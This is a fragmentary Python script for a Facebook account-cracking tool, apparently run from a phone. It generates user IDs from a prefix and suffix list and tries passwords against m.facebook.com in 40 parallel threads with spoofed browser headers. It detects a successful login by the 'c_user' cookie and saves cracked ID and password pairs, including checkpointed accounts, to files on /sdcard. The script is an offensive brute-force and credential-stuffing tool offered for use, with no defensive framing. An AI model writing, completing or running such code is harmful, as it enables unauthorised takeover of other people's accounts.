...
def DADDY():
    ...
    print("")
    DADDY = input(f'\033[1;32m CHOICE OPTION:\033[1;36m ')
    if DADDY in ["1","A"]:
        DADDYs()
    if DADDY in ["0","X"]:
        os.system('exit')
...
def DADDYs():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        for love in user:
            ...
            uid = code+love
            Fb_crack.submit(DADDYm,uid,pwx,tl)
    print(' \033[1;91m[\033[1;92m\033[1;91m]\033[1;92mCOMPLETE ')
   


def DADDYm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    ...
    'dpr': '2',
    'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfdNEleRo5HFTLsoyHY15XMYzeaHuDhI5NQoq6skAmjgr91WcJsuy2fh3lkmFtn8qXhIS0HnjR1BKRbimpYVWOZ5hXoBwDFS788juYS3LOcPBQ&smuh=24745&lh=Ac_TBv170kCdzrqSsv4&wtsid=rdr_04YJ22I7tJXUMgJBO&_rdr',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/DADDY-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/DADDY-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
